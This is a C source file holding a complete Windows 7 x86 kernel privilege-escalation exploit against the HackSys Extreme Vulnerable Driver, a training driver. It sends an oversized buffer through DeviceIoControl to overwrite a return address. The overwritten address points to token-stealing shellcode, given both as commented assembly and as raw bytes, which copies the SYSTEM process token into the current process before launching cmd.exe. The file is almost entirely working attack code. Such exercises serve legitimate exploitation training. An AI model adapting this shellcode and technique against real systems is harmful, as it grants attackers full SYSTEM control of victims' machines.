#include <windows.h>
#include <stdio.h>
#include <cstdio>

#define STACK_OVERFLOW    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define KTHREAD_OFFSET  0x124		
#define EPROCESS_OFFSET 0x050		
#define FLINK_OFFSET    0x0b8		
#define PID_OFFSET      0x0b4		
#define TOKEN_OFFSET    0x0f8		
#define SYSTEM_PID      0x004		




//VOID TokenStealingShellcodeWin7()
//{
//	__asm
//	{
//		; initialize
//		pushad;
//		mov eax, fs: [KTHREAD_OFFSET] ;         //get current thread
//		mov ecx, [eax + EPROCESS_OFFSET];       //get the process
//		mov eax, ecx;
//		mov ebx, SYSTEM_PID;
//
//	SearchSystemPID:
//		mov eax, [eax + FLINK_OFFSET];          //get the ActiveProcessLinks
//		sub eax, FLINK_OFFSET;
//		mov edx, [eax + PID_OFFSET];            //get the PID
//		cmp edx, ebx;
//		jnz SearchSystemPID;
//
//		mov edx, [eax + TOKEN_OFFSET];	        //change the token
//		mov[ecx + TOKEN_OFFSET], edx;
//
//		; recovery
//			popad;
//		add esp, 0xC;                           //fix the stack
//		pop ebp;
//		ret 8;
//	}
//}
int main()
{

	CHAR ShellCode[] = "\x90\x90\x90\x90\x90\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\x31\xC0"
		"\x5D"
		"\xC2\x08\x00"
		;
	LPVOID Payload;
	HANDLE Device;
	LPCWSTR DeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
	BOOL Result;
	HANDLE hDefaultHeap;
	Device = CreateFile(DeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);

	if (Device == INVALID_HANDLE_VALUE)
	{
		printf(" [-] Unable get  Driver handle!\n\n");
		exit(1);
	}
	Payload = VirtualAlloc(
		NULL,
		sizeof(ShellCode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	RtlCopyMemory(Payload, ShellCode, sizeof(ShellCode));
	printf(" -> Done!\n");
	printf(" [+]  Device Handle: 0x%p \n\n", Device);

	hDefaultHeap = GetProcessHeap();
	size_t Buffer_len = 0x820; //2080
	PUCHAR Buffer = (PUCHAR)HeapAlloc(hDefaultHeap, 0, Buffer_len);

	printf("Allocated   Memory  of 0x820 bytes at 0x%p\n", Buffer);
	RtlFillMemory(Buffer, 0x850, 'A');
	RtlFillMemory(Buffer + 0x820 - 0x4 , 0x4, 'B');
	RtlCopyMemory(Buffer + 0x820, &Payload, 0x4);

	//*(PULONG)(Buffer + 0x820) = (ULONG)TokenStealingShellcodeWin7;
	DWORD junk_P = 0;
	Result = DeviceIoControl(Device,
		STACK_OVERFLOW,
		Buffer,
		0x824,
		NULL,
		0,
		&junk_P,
		NULL);
	if (!Result) {
		printf("  [-] Failed to send Data!\n\n");
		CloseHandle(Device);
		exit(1);
	}
	system("cmd.exe");
	HeapFree(GetProcessHeap(), 0, (PVOID)Buffer);

	printf(" -> Done!\n\n");

	printf(R"EOF(
     .... NO! ...                  ... MNO! ...
   ..... MNO!! ...................... MNNOO! ...
 ..... MMNO! ......................... MNNOO!! .
.... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
 ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...  
    ....... MMMMM..    OPPMMP    .,OMI! ....
     ...... MMMM::   o.,OPMP,.o   ::I!! ...
         .... NNM:::.,,OOPM!P,.::::!! ....
          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
           .. MMMMMNNOOMMNNIIIPPPOO!! ......
          ...... MMMONNMMNNNIIIOO!..........
       ....... MN MOMMMNNNIIIIIO! OO ..........
    ......... MNO! IiiiiiiiiiiiI OOOO ...........
  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
      ...... OO! ................. ON! .......
         ................................
		Hejap Zairy
)EOF");

	CloseHandle(Device);
}
